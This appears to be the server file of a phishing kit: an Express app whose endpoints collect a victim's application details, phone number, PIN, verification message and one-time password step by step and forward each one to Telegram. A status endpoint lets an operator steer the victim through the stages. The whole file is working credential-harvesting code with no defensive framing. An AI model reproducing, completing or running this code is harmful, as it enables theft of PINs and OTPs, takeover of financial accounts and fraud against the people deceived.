// server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const db = require('./db');
const telegram = require('./telegram');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/apply', async (req, res) => {
    const sessionId = Date.now().toString();
    const data = req.body;
    db.createSession(sessionId, data);
    await telegram.sendApplicationToTelegram(sessionId, data);
    res.json({ success: true, sessionId });
});

app.post('/api/login', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_PIN');
    session.phone = phone;
    session.pin = pin;

    await telegram.sendPinToTelegram(sessionId, { phone, pin });
    res.json({ success: true });
});

app.post('/api/verification', async (req, res) => {
    const { sessionId, verificationMsg } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_VERIFICATION');
    session.verificationMsg = verificationMsg;

    await telegram.sendVerificationToTelegram(sessionId, { phone: session.phone, verificationMsg });
    res.json({ success: true });
});

app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_OTP');
    session.otp = otp;

    await telegram.sendOtpToTelegram(sessionId, { phone: session.phone, otp });
    res.json({ success: true });
});

app.get('/api/status/:sessionId', (req, res) => {
    const session = db.getSession(req.params.sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });
    res.json({ status: session.status });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});